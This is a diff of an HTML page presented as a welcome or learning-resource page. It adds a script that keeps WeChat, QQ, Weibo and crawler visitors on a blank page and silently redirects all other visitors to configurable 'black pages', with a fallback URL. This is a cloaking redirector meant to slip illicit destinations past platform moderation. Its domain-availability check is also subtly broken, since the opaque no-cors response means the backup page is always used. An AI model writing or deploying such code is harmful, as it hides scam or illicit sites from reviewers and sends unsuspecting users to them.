@@ -7,38 +7,78 @@
   <meta name="robots" content="noindex, nofollow" />
 </head>
 <body>
-  <h1>欢迎访问学习资源库</h1>
-  <p>页面加载中，请稍候...</p>
+<h1>欢迎访问</h1>
+<p>页面加载中，请稍候...</p>
 
-  <script>
-    (async function () {
-      const ua = navigator.userAgent.toLowerCase();
-      const isSafe = !(
-        ua.includes("micromessenger") ||
-        ua.includes("qq/") ||
-        ua.includes("weibo") ||
-        /spider|bot|crawl/.test(ua)
-      );
+<script>
+  (async function () {
+    // 判断是否在风控环境
+    const ua = navigator.userAgent.toLowerCase();
+    const isSafe = !(
+            ua.includes("micromessenger") ||
+            ua.includes("qq/") ||
+            ua.includes("weibo") ||
+            /spider|bot|crawl/.test(ua)
+    );
 
-      if (!isSafe) {
-        console.log("风控环境，停留在白页");
-        return;
-      }
+    if (!isSafe) {
+      console.log("风控环境，停留在白页");
+      return;
+    }
 
-      try {
-        const res = await fetch("config.json?_=" + Date.now());
-        const data = await res.json();
-        if (data && data.url) {
-          setTimeout(() => {
-            window.location.href = data.url;
-          }, 2000);
+    // 解析 URL 参数，获取指定的跳转目标
+    const urlParams = new URLSearchParams(window.location.search);
+    const pageType = urlParams.get("page");  // 获取 'page' 参数
+    let selectedUrl = "";
+
+    // 加载配置文件
+    try {
+      const res = await fetch("config.json?_=" + Date.now());
+      const data = await res.json();
+
+      // 根据 URL 参数选择指定的黑页
+      if (data && data.pages && pageType) {
+        const page = data.pages[pageType];
+        if (page) {
+          selectedUrl = page.url;
+          const backupUrl = page.backup;
+
+          // 检测目标域名是否可用
+          const isAvailable = await checkDomainAvailability(selectedUrl);
+
+          if (isAvailable) {
+            // 如果可用，延迟 2 秒后跳转
+            setTimeout(() => {
+              window.location.href = selectedUrl;
+            }, 2000);
+          } else {
+            console.warn("目标域名不可用，跳转到备用黑页");
+            // 如果不可用，跳转到备用黑页
+            setTimeout(() => {
+              window.location.href = backupUrl;
+            }, 2000);
+          }
         } else {
-          console.warn("配置无效，未跳转");
+          console.warn("指定的页面不存在");
         }
-      } catch (e) {
-        console.error("跳转失败", e);
+      } else {
+        console.warn("配置无效或未提供页面参数");
       }
-    })();
-  </script>
+    } catch (e) {
+      console.error("加载配置失败", e);
+    }
+  })();
+
+  // 检测目标域名是否可用
+  async function checkDomainAvailability(url) {
+    try {
+      const response = await fetch(url, { method: 'HEAD', mode: 'no-cors' });
+      return response.ok;
+    } catch (e) {
+      console.error("检测目标域名失败", e);
+      return false;
+    }
+  }
+</script>
 </body>
 </html>
